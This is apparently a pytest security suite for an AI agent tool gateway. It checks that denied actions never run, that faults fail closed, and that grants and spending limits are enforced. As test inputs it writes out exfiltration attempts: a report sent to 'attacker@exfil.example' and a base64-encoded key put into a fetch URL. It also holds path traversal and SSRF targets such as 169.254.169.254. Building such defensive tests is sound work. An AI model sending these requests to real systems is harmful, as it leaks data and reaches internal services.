"""T03 (R03): a denied executor is never invoked; checked and dispatched arguments match."""
import pytest

from conftest import APP, PID, agent, denied_invocations, ingest, run, task
from server.canonical import hash_value
from server.executors.fetch import check_url
from server.executors.base import ResourceViolation
from server.projects import ConflictError
from server.schemas import ActionProposal, TaskBody
from server.storage.db import StorageUnavailable

pytestmark = pytest.mark.security


def _idle_run(core, tools=("read_source", "write_report", "send_report", "delete_file", "make_payment", "fetch_url"), **kw):
    sid = ingest(core, "ops_ascii.md")
    body = dict(task_id="t_gw", goal="gateway", tools=list(tools), recipient_ids=["finance_team"], outbound_data_classes=["approved_report"],
                resources={"source_ids": [sid], "output_path": "reports/r.md"})
    body.update(kw)
    core.projects.create_task_revision(PID, TaskBody(**body), APP)
    a = agent(core)
    r = core.coordinator.start_run(PID, a["agent_id"], "t_gw", wait=False)
    core.jobs.cancel(core.db.scalar("SELECT job_id FROM jobs ORDER BY created_at DESC LIMIT 1"))
    return r


def submit(core, r, tool, args, op=None, action=None):
    if op is None:
        action, op = core.coordinator.issue_operation(r, tool)
    return core.gateway.submit(r["run_id"], ActionProposal(action_id=action, operation_id=op, tool_id=tool, arguments=args), core.worker_identity)


def test_allowed_dispatch_uses_checked_arguments(core):
    r = _idle_run(core)
    v = submit(core, r, "write_report", {"path": "reports/r.md", "content": "hello"})
    assert v.outcome == "ALLOW" and v.executor_invoked and v.effect_state == "COMPLETED"
    inv = core.db.one("SELECT * FROM executor_invocations WHERE decision_id=?", (v.decision_id,))
    d = core.db.one("SELECT * FROM decisions WHERE decision_id=?", (v.decision_id,))
    assert inv["args_hash"] == d["args_hash"] == hash_value({"path": "reports/r.md", "content": "hello"})
    with pytest.raises(ConflictError):  # the decision cannot be dispatched twice
        core.gateway.dispatch(v.decision_id, "worker:x")


def test_denied_never_invokes_executor(core):
    r = _idle_run(core)
    for tool, args in [("send_report", {"recipient_id": "attacker@exfil.example", "artifact_path": "reports/r.md"}),
                       ("send_report", {"recipient_id": "finance_team", "artifact_path": "reports/unchecked.md"}),
                       ("read_file", {"path": "x"}),
                       ("write_report", {"path": "../x.md", "content": "x"}),
                       ("write_report", {"path": "r.md", "content": "x", "extra": 1}),
                       ("make_payment", {"payee_id": "payee_cloud_vendor", "amount": "5000.00", "currency": "USD"})]:
        v = submit(core, r, tool, args)
        assert v.outcome in ("DENY", "PAUSE") and not v.executor_invoked, (tool, v.reason_code)
        if r["status"] != "running":
            break
    assert denied_invocations(core) == 0
    assert core.executors.outbox.count(PID) == 0


def test_operation_identity(core):
    r = _idle_run(core)
    v = submit(core, r, "write_report", {"path": "reports/r.md", "content": "a"}, op="op_forged", action="act_forged")
    assert v.outcome == "DENY" and v.reason_code == "OPERATION_NOT_ISSUED"
    act, op = core.coordinator.issue_operation(r, "write_report")
    v1 = submit(core, r, "write_report", {"path": "reports/r.md", "content": "a"}, op=op, action=act)
    assert v1.outcome == "ALLOW"
    with pytest.raises(ConflictError):  # same operation, different arguments
        submit(core, r, "write_report", {"path": "reports/r.md", "content": "b"}, op=op, action=act)
    again = submit(core, r, "write_report", {"path": "reports/r.md", "content": "a"}, op=op, action=act)
    assert again.deduplicated and not again.executor_invoked
    assert core.db.scalar("SELECT COUNT(*) FROM executor_invocations WHERE operation_id=?", (op,)) == 1


def test_guessed_operation_of_other_run_conflicts(core):
    r = _idle_run(core)
    act, op = core.coordinator.issue_operation(r, "write_report")
    submit(core, r, "write_report", {"path": "reports/r.md", "content": "a"}, op=op, action=act)
    other = core.coordinator.start_run(PID, r["agent_id"], "t_gw", branch_id=core.versions.create_branch(PID, r["agent_id"], "b2", core.versions.branch(r["branch_id"])["state"])["branch_id"], wait=False)
    with pytest.raises(ConflictError) as e:
        core.gateway.submit(other["run_id"], ActionProposal(action_id=act, operation_id=op, tool_id="write_report",
                                                            arguments={"path": "reports/r.md", "content": "a"}), core.worker_identity)
    assert e.value.code == "OPERATION_CONFLICT" and "result" not in str(e.value.detail or "")


def test_auditor_failures_fail_closed_for_mutating_actions(core):
    r = _idle_run(core)
    assert submit(core, r, "write_report", {"path": "reports/r.md", "content": "approved text"}).outcome == "ALLOW"
    core.coordinator.check_artifact(r, "reports/r.md")
    for fault in ("timeout", "malformed"):
        core.auditor.fault = fault
        v = submit(core, r, "send_report", {"recipient_id": "finance_team", "artifact_path": "reports/r.md"})
        assert v.outcome == "PAUSE" and v.reason_code == "AUDIT_FAILED"
        core.coordinator.set_status(r["run_id"], "running")
    core.auditor.fault = None
    assert denied_invocations(core) == 0


def test_storage_unavailable_fails_closed(core):
    r = _idle_run(core)
    core.db.fail_injection = "unavailable"
    try:
        with pytest.raises(StorageUnavailable):
            submit(core, r, "write_report", {"path": "reports/r.md", "content": "a"})
    finally:
        core.db.fail_injection = None
    assert core.db.scalar("SELECT COUNT(*) FROM executor_invocations") == 0


def test_high_impact_grants(core):
    r = _idle_run(core)
    submit(core, r, "write_report", {"path": "reports/old.md", "content": "old"})
    v = submit(core, r, "delete_file", {"path": "reports/old.md"})
    assert v.outcome == "PAUSE" and v.reason_code == "GRANT_REQUIRED"
    g = core.projects.create_grant(PID, APP, "delete_file", {"path": "reports/old.md"}, None, {}, 600, 1)
    body = core.projects.get_task(PID, "t_gw")["body"]
    body["grant_refs"] = [g["grant_id"]]
    core.projects.create_task_revision(PID, TaskBody(**body), APP)
    core.coordinator.set_status(r["run_id"], "superseded")
    r2 = core.coordinator.start_run(PID, r["agent_id"], "t_gw", branch_id=r["branch_id"], wait=False)
    v2 = submit(core, r2, "delete_file", {"path": "reports/old.md"})
    assert v2.outcome == "ALLOW" and v2.effect_state == "COMPLETED"
    assert core.db.scalar("SELECT remaining_uses FROM grants WHERE grant_id=?", (g["grant_id"],)) == 0
    v3 = submit(core, r2, "delete_file", {"path": "reports/old.md"})
    assert v3.outcome == "PAUSE" and v3.reason_code == "GRANT_REQUIRED"


def test_spending_limit(core):
    r = _idle_run(core, write_network={"destination_ids": ["payee_cloud_vendor"]}, spending={"currency": "USD", "limit": "100.00"})
    g = core.projects.create_grant(PID, APP, "make_payment", None, "make_payment", {}, 600, 5)
    body = core.projects.get_task(PID, "t_gw")["body"]
    body["grant_refs"] = [g["grant_id"]]
    core.projects.create_task_revision(PID, TaskBody(**body), APP)
    core.coordinator.set_status(r["run_id"], "superseded")
    r = core.coordinator.start_run(PID, r["agent_id"], "t_gw", branch_id=r["branch_id"], wait=False)
    assert submit(core, r, "make_payment", {"payee_id": "payee_cloud_vendor", "amount": "60.00", "currency": "USD"}).outcome == "ALLOW"
    v = submit(core, r, "make_payment", {"payee_id": "payee_cloud_vendor", "amount": "60.00", "currency": "USD"})
    assert v.outcome == "DENY" and v.reason_code == "SPENDING_LIMIT"
    v = submit(core, r, "make_payment", {"payee_id": "attacker", "amount": "1.00", "currency": "USD"})
    assert v.reason_code == "DESTINATION_NOT_AUTHORIZED"
    assert len(core.executors.ledger.entries(PID)) == 1


def test_ssrf_and_egress(core):
    pub = lambda h: ["93.184.216.34"]  # noqa: E731
    for url, resolver in [("http://example.com/", pub), ("https://127.0.0.1/", pub), ("https://internal.example/", lambda h: ["10.0.0.5"]),
                          ("https://user:pw@example.com/", pub), ("https://example.com:8443/", pub), ("https://meta.example/", lambda h: ["169.254.169.254"])]:
        with pytest.raises(ResourceViolation):
            check_url(url, None, resolver)
    assert check_url("https://example.com/a", None, pub) == "example.com"
    r = _idle_run(core, read_network={"public_https": True})
    import base64
    blob = base64.b64encode(b"key CANARY-7F3A-SYNTHETIC").decode()
    v = submit(core, r, "fetch_url", {"url": f"https://example.com/collect?d={blob}"})
    assert v.outcome == "DENY" and v.reason_code == "SCOPE_VIOLATION"


def test_fetch_executor_redirect_rechecks(core):
    import httpx
    from server.executors.fetch import FetchExecutor

    def handler(req):
        if req.url.host == "start.example":
            return httpx.Response(302, headers={"location": "https://internal.example/secret"})
        return httpx.Response(200, headers={"content-type": "text/html"}, text="<p>ok</p>")
    res = {"start.example": ["93.184.216.34"], "internal.example": ["192.168.1.10"], "ok.example": ["93.184.216.34"]}
    fx = FetchExecutor(10000, 3, 5, resolver=lambda h: res[h], transport=httpx.MockTransport(handler))
    with pytest.raises(ResourceViolation):
        fx.fetch("https://start.example/", None)
    out = fx.fetch("https://ok.example/", None)
    assert out["status"] == "ok" and out["body"] == b"<p>ok</p>"
